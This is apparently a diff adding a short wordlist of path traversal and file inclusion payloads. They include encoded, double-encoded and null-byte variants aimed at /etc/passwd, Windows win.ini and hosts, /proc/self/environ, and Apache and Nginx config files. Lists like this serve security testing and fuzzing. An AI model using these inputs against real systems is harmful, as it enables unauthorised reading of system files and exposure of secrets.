@@ -1,0 +1,15 @@
+../../../etc/passwd
+../../../etc/passwd%00
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+..\\..\\..\\windows\\win.ini
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..\x5c..\x5c..\x5cwindows\x5cwin.ini
+/var/www/html/index.php
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
